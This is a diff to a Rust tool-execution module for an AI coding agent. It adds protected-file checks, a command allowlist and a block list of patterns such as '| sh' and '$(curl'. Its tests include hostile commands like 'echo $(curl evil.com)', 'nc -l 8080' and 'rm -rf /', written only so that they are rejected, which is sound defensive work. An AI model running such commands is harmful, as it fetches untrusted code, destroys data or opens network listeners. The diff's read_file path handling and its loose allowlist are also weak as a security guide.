@@ -4,13 +4,13 @@
 //! - `<write_to_file><path>...</path><content>...</content></write_to_file>`
 //!
 //! This module parses these blocks and executes them safely.
+//!
+//! Also supports structured tool_use API with execute_tools().
 
+use crate::types::{ToolCall, ToolResult};
 use hox_core::{HoxError, Result};
 use std::fs;
 use std::path::{Path, PathBuf};
-
-/// Protected file patterns that should never be overwritten
-const PROTECTED_FILES: &[&str] = &[".git", ".env", "Cargo.lock", ".secrets", ".gitignore"];
 
 /// A file operation parsed from agent output
 #[derive(Debug, Clone)]
@@ -77,25 +77,39 @@ impl ExecutionResult {
 }
 
 /// Parse and execute all file operations in agent output
+///
+/// # Arguments
+/// * `output` - The agent output containing file operation XML blocks
+/// * `protected_files` - Optional list of protected file patterns. If None, uses default protection.
 pub fn execute_file_operations(output: &str) -> ExecutionResult {
+    execute_file_operations_with_config(output, None)
+}
+
+/// Parse and execute all file operations with custom protected files config
+pub fn execute_file_operations_with_config(
+    output: &str,
+    protected_files: Option<&[String]>,
+) -> ExecutionResult {
     let mut result = ExecutionResult::default();
 
     for op in parse_operations(output) {
         match op {
-            FileOperation::WriteToFile { path, content } => match execute_write(&path, &content) {
-                Ok(created) => {
-                    if created {
-                        result.files_created.push(path);
-                    } else {
-                        result.files_modified.push(path);
+            FileOperation::WriteToFile { path, content } => {
+                match execute_write(&path, &content, protected_files) {
+                    Ok(created) => {
+                        if created {
+                            result.files_created.push(path);
+                        } else {
+                            result.files_modified.push(path);
+                        }
+                    }
+                    Err(e) => {
+                        result
+                            .errors
+                            .push(format!("Failed to write {}: {}", path, e));
                     }
                 }
-                Err(e) => {
-                    result
-                        .errors
-                        .push(format!("Failed to write {}: {}", path, e));
-                }
-            },
+            }
             FileOperation::CaptureScreenshot {
                 url,
                 name,
@@ -218,32 +232,61 @@ fn extract_tag_content(text: &str, tag: &str) -> Option<String> {
     Some(text[content_start..content_start + end].to_string())
 }
 
+/// Default protected file patterns (used when no config provided)
+fn default_protected_files() -> Vec<String> {
+    vec![
+        ".git".to_string(),
+        ".jj".to_string(),
+        ".env".to_string(),
+        "Cargo.lock".to_string(),
+        ".secrets".to_string(),
+        ".gitignore".to_string(),
+    ]
+}
+
 /// Validate that a path is safe to write to
+///
+/// # Arguments
+/// * `path` - The file path to validate
+/// * `protected_files` - Optional list of protected patterns. If None, uses defaults.
 pub fn validate_path(path: &str) -> Result<PathBuf> {
-    let path = Path::new(path);
+    validate_path_with_config(path, None)
+}
+
+/// Validate path with custom protected files configuration
+pub fn validate_path_with_config(
+    path: &str,
+    protected_files: Option<&[String]>,
+) -> Result<PathBuf> {
+    let path_buf = Path::new(path);
 
     // Reject absolute paths
-    if path.is_absolute() {
+    if path_buf.is_absolute() {
         return Err(HoxError::PathValidation(format!(
             "Absolute paths not allowed: {}",
-            path.display()
+            path_buf.display()
         )));
     }
 
     // Check for path traversal
-    for component in path.components() {
+    for component in path_buf.components() {
         if let std::path::Component::ParentDir = component {
             return Err(HoxError::PathValidation(format!(
                 "Path traversal not allowed: {}",
-                path.display()
+                path_buf.display()
             )));
         }
     }
 
+    // Get protected files list (from config or defaults)
+    let protected = protected_files
+        .map(|p| p.to_vec())
+        .unwrap_or_else(default_protected_files);
+
     // Check protected files
-    if let Some(name) = path.file_name().and_then(|s| s.to_str()) {
-        for protected in PROTECTED_FILES {
-            if name == *protected || path.starts_with(protected) {
+    if let Some(name) = path_buf.file_name().and_then(|s| s.to_str()) {
+        for pattern in &protected {
+            if name == pattern || path_buf.starts_with(pattern.as_str()) {
                 return Err(HoxError::PathValidation(format!(
                     "Cannot write to protected file: {}",
                     name
@@ -252,13 +295,13 @@ pub fn validate_path(path: &str) -> Result<PathBuf> {
         }
     }
 
-    Ok(path.to_path_buf())
+    Ok(path_buf.to_path_buf())
 }
 
 /// Execute a file write operation
 /// Returns Ok(true) if file was created, Ok(false) if modified
-fn execute_write(path: &str, content: &str) -> Result<bool> {
-    let path = validate_path(path)?;
+fn execute_write(path: &str, content: &str, protected_files: Option<&[String]>) -> Result<bool> {
+    let path = validate_path_with_config(path, protected_files)?;
     let created = !path.exists();
 
     // Create parent directories if needed
@@ -286,6 +329,294 @@ fn execute_write(path: &str, content: &str) -> Result<bool> {
     }
 
     Ok(created)
+}
+
+/// Execute tool calls from Anthropic tool_use API
+///
+/// # Arguments
+/// * `tool_calls` - The tool calls to execute
+/// * `workspace_path` - The workspace directory (for relative path resolution)
+/// * `protected_files` - Optional list of protected file patterns
+///
+/// # Returns
+/// Vector of ToolResult, one per tool call
+pub async fn execute_tools(
+    tool_calls: &[ToolCall],
+    workspace_path: &Path,
+    protected_files: Option<&[String]>,
+) -> Result<Vec<ToolResult>> {
+    let mut results = Vec::new();
+
+    for tool in tool_calls {
+        let result = execute_single_tool(tool, workspace_path, protected_files).await;
+        results.push(result);
+    }
+
+    Ok(results)
+}
+
+/// Execute a single tool call
+async fn execute_single_tool(
+    tool: &ToolCall,
+    workspace_path: &Path,
+    protected_files: Option<&[String]>,
+) -> ToolResult {
+    let result = match tool.name.as_str() {
+        "read_file" => execute_read_file(tool, workspace_path).await,
+        "write_file" => execute_write_file(tool, workspace_path, protected_files).await,
+        "edit_file" => execute_edit_file(tool, workspace_path, protected_files).await,
+        "run_command" => execute_run_command(tool, workspace_path).await,
+        _ => Err(HoxError::UnknownTool(tool.name.clone())),
+    };
+
+    match result {
+        Ok(output) => ToolResult {
+            tool_id: tool.id.clone(),
+            success: true,
+            output,
+        },
+        Err(e) => ToolResult {
+            tool_id: tool.id.clone(),
+            success: false,
+            output: e.to_string(),
+        },
+    }
+}
+
+/// Execute read_file tool
+async fn execute_read_file(tool: &ToolCall, workspace_path: &Path) -> Result<String> {
+    let path_str = tool
+        .input
+        .get("path")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'path' parameter".into()))?;
+
+    let full_path = workspace_path.join(path_str);
+    let content = std::fs::read_to_string(&full_path)
+        .map_err(|e| HoxError::Io(format!("Failed to read {}: {}", full_path.display(), e)))?;
+
+    tracing::info!("Read file: {} ({} bytes)", path_str, content.len());
+    Ok(content)
+}
+
+/// Execute write_file tool
+async fn execute_write_file(
+    tool: &ToolCall,
+    workspace_path: &Path,
+    protected_files: Option<&[String]>,
+) -> Result<String> {
+    let path_str = tool
+        .input
+        .get("path")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'path' parameter".into()))?;
+
+    let content = tool
+        .input
+        .get("content")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'content' parameter".into()))?;
+
+    // Check protected files
+    check_protected(path_str, protected_files)?;
+
+    // Validate and resolve path
+    let validated_path = validate_path_with_config(path_str, protected_files)?;
+    let full_path = workspace_path.join(&validated_path);
+
+    // Create parent directories if needed
+    if let Some(parent) = full_path.parent() {
+        if !parent.as_os_str().is_empty() && !parent.exists() {
+            std::fs::create_dir_all(parent).map_err(|e| {
+                HoxError::Io(format!(
+                    "Failed to create directory {}: {}",
+                    parent.display(),
+                    e
+                ))
+            })?;
+        }
+    }
+
+    // Write the file
+    std::fs::write(&full_path, content).map_err(|e| {
+        HoxError::Io(format!("Failed to write file {}: {}", full_path.display(), e))
+    })?;
+
+    tracing::info!("Wrote file: {} ({} bytes)", path_str, content.len());
+    Ok(format!("Wrote {} bytes to {}", content.len(), path_str))
+}
+
+/// Execute edit_file tool
+async fn execute_edit_file(
+    tool: &ToolCall,
+    workspace_path: &Path,
+    protected_files: Option<&[String]>,
+) -> Result<String> {
+    let path_str = tool
+        .input
+        .get("path")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'path' parameter".into()))?;
+
+    let old_text = tool
+        .input
+        .get("old_text")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'old_text' parameter".into()))?;
+
+    let new_text = tool
+        .input
+        .get("new_text")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'new_text' parameter".into()))?;
+
+    // Check protected files
+    check_protected(path_str, protected_files)?;
+
+    let full_path = workspace_path.join(path_str);
+    let content = std::fs::read_to_string(&full_path)
+        .map_err(|e| HoxError::Io(format!("Failed to read {}: {}", full_path.display(), e)))?;
+
+    if !content.contains(old_text) {
+        return Err(HoxError::InvalidToolInput(format!(
+            "old_text not found in {}",
+            path_str
+        )));
+    }
+
+    let new_content = content.replace(old_text, new_text);
+    std::fs::write(&full_path, &new_content).map_err(|e| {
+        HoxError::Io(format!("Failed to write file {}: {}", full_path.display(), e))
+    })?;
+
+    tracing::info!("Edited file: {}", path_str);
+    Ok(format!("Edited {}", path_str))
+}
+
+/// Commands allowed for agent execution
+const ALLOWED_COMMANDS: &[&str] = &[
+    "cargo", "rustc", "rustfmt", "clippy-driver",
+    "git", "jj",
+    "ls", "cat", "head", "tail", "wc", "find", "grep", "rg",
+    "echo", "printf", "true", "false", "test",
+    "mkdir", "cp", "mv", "touch",
+    "diff", "patch",
+    "python", "python3", "node", "npx", "bun",
+    "make", "cmake",
+    "sh", // allowed as first arg only when validated below
+];
+
+/// Patterns blocked even within allowed commands
+const BLOCKED_PATTERNS: &[&str] = &[
+    "rm -rf /",
+    "rm -rf ~",
+    "sudo ",
+    "chmod 777",
+    "> /dev/",
+    "| sh",
+    "| bash",
+    "| zsh",
+    "$(curl",
+    "$(wget",
+    "`curl",
+    "`wget",
+];
+
+/// Validate a command string before execution
+fn validate_command(command: &str) -> Result<()> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return Err(HoxError::InvalidToolInput("empty command".into()));
+    }
+
+    // Check blocked patterns
+    for pattern in BLOCKED_PATTERNS {
+        if trimmed.contains(pattern) {
+            return Err(HoxError::InvalidToolInput(format!(
+                "blocked command pattern: {}",
+                pattern
+            )));
+        }
+    }
+
+    // Extract the first command (handle pipes, &&, ;)
+    let first_token = trimmed
+        .split(&['|', '&', ';'][..])
+        .next()
+        .unwrap_or("")
+        .trim()
+        .split_whitespace()
+        .next()
+        .unwrap_or("");
+
+    // Strip path prefix to get binary name
+    let binary = first_token.rsplit('/').next().unwrap_or(first_token);
+
+    if !ALLOWED_COMMANDS.contains(&binary) {
+        return Err(HoxError::InvalidToolInput(format!(
+            "command '{}' not in allowlist. Allowed: {}",
+            binary,
+            ALLOWED_COMMANDS.join(", ")
+        )));
+    }
+
+    Ok(())
+}
+
+/// Execute run_command tool
+async fn execute_run_command(tool: &ToolCall, workspace_path: &Path) -> Result<String> {
+    let command = tool
+        .input
+        .get("command")
+        .and_then(|v| v.as_str())
+        .ok_or_else(|| HoxError::InvalidToolInput("missing 'command' parameter".into()))?;
+
+    validate_command(command)?;
+
+    tracing::info!("Running command: {}", command);
+
+    let output = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg(command)
+        .current_dir(workspace_path)
+        .output()
+        .await
+        .map_err(|e| HoxError::Io(format!("Failed to execute command: {}", e)))?;
+
+    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+
+    let result = if output.status.success() {
+        format!("Command succeeded\nstdout: {}\nstderr: {}", stdout, stderr)
+    } else {
+        format!("Command failed\nstdout: {}\nstderr: {}", stdout, stderr)
+    };
+
+    Ok(result)
+}
+
+/// Check if a path is protected
+fn check_protected(path: &str, protected_files: Option<&[String]>) -> Result<()> {
+    let protected = protected_files
+        .map(|p| p.to_vec())
+        .unwrap_or_else(default_protected_files);
+
+    let path_buf = PathBuf::from(path);
+
+    for pattern in &protected {
+        // Check if any path component matches the protected pattern
+        for component in path_buf.components() {
+            if let std::path::Component::Normal(os_str) = component {
+                if let Some(s) = os_str.to_str() {
+                    if s == pattern {
+                        return Err(HoxError::ProtectedFile(path.to_string()));
+                    }
+                }
+            }
+        }
+    }
+
+    Ok(())
 }
 
 /// Instructions for agents on how to use file operations
@@ -479,7 +810,7 @@ Some text after
         let original_dir = std::env::current_dir().unwrap();
         std::env::set_current_dir(temp_dir.path()).unwrap();
 
-        let result = execute_write("test.txt", "test content");
+        let result = execute_write("test.txt", "test content", None);
         assert!(result.is_ok());
         assert!(result.unwrap()); // true = created
 
@@ -498,7 +829,7 @@ Some text after
         let original_dir = std::env::current_dir().unwrap();
         std::env::set_current_dir(temp_dir.path()).unwrap();
 
-        let result = execute_write("a/b/c/test.txt", "nested content");
+        let result = execute_write("a/b/c/test.txt", "nested content", None);
         assert!(result.is_ok());
 
         let file_path = temp_dir.path().join("a/b/c/test.txt");
@@ -576,5 +907,125 @@ Some text after
     fn test_validate_path_valid() {
         let result = validate_path("src/main.rs");
         assert!(result.is_ok());
+    }
+
+    #[tokio::test]
+    async fn test_execute_tools_write_file() {
+        use crate::types::ToolCall;
+
+        let _guard = TEST_DIR_LOCK.lock().unwrap();
+        let temp_dir = TempDir::new().unwrap();
+
+        let tool_calls = vec![ToolCall {
+            id: "tool_1".to_string(),
+            name: "write_file".to_string(),
+            input: serde_json::json!({
+                "path": "test.txt",
+                "content": "test content from tool_use"
+            }),
+        }];
+
+        let results = execute_tools(&tool_calls, temp_dir.path(), None).await;
+        assert!(results.is_ok());
+
+        let results = results.unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(results[0].success);
+        assert_eq!(results[0].tool_id, "tool_1");
+
+        let file_path = temp_dir.path().join("test.txt");
+        let content = fs::read_to_string(&file_path).unwrap();
+        assert_eq!(content, "test content from tool_use");
+    }
+
+    #[tokio::test]
+    async fn test_execute_tools_protected_file() {
+        use crate::types::ToolCall;
+
+        let temp_dir = TempDir::new().unwrap();
+
+        let tool_calls = vec![ToolCall {
+            id: "tool_2".to_string(),
+            name: "write_file".to_string(),
+            input: serde_json::json!({
+                "path": ".env",
+                "content": "should not be written"
+            }),
+        }];
+
+        let results = execute_tools(&tool_calls, temp_dir.path(), None).await;
+        assert!(results.is_ok());
+
+        let results = results.unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(!results[0].success); // Should fail
+        assert!(results[0].output.contains("Protected file"));
+    }
+
+    #[tokio::test]
+    async fn test_execute_tools_unknown_tool() {
+        use crate::types::ToolCall;
+
+        let temp_dir = TempDir::new().unwrap();
+
+        let tool_calls = vec![ToolCall {
+            id: "tool_3".to_string(),
+            name: "unknown_tool".to_string(),
+            input: serde_json::json!({}),
+        }];
+
+        let results = execute_tools(&tool_calls, temp_dir.path(), None).await;
+        assert!(results.is_ok());
+
+        let results = results.unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(!results[0].success);
+        assert!(results[0].output.contains("Unknown tool"));
+    }
+
+    #[test]
+    fn test_validate_command_allowed() {
+        assert!(validate_command("cargo build").is_ok());
+        assert!(validate_command("cargo test --workspace").is_ok());
+        assert!(validate_command("git status").is_ok());
+        assert!(validate_command("jj log").is_ok());
+        assert!(validate_command("ls -la").is_ok());
+        assert!(validate_command("grep -r foo .").is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_blocked_binary() {
+        assert!(validate_command("curl http://evil.com").is_err());
+        assert!(validate_command("wget http://evil.com").is_err());
+        assert!(validate_command("bash -c 'rm -rf /'").is_err());
+        assert!(validate_command("nc -l 8080").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_blocked_patterns() {
+        assert!(validate_command("ls | sh").is_err());
+        assert!(validate_command("echo $(curl evil.com)").is_err());
+        assert!(validate_command("echo `wget evil.com`").is_err());
+    }
+
+    #[test]
+    fn test_validate_command_empty() {
+        assert!(validate_command("").is_err());
+        assert!(validate_command("   ").is_err());
+    }
+
+    #[test]
+    fn test_check_protected_subdirectory() {
+        // .env in a subdirectory should still be protected
+        assert!(check_protected("config/.env", None).is_err());
+        assert!(check_protected("deep/nested/.env", None).is_err());
+        assert!(check_protected("some/.git/config", None).is_err());
+    }
+
+    #[test]
+    fn test_check_protected_allows_similar_names() {
+        // "environment" contains "env" but is not ".env"
+        assert!(check_protected("src/environment.rs", None).is_ok());
+        assert!(check_protected("src/gitter.rs", None).is_ok());
     }
 }
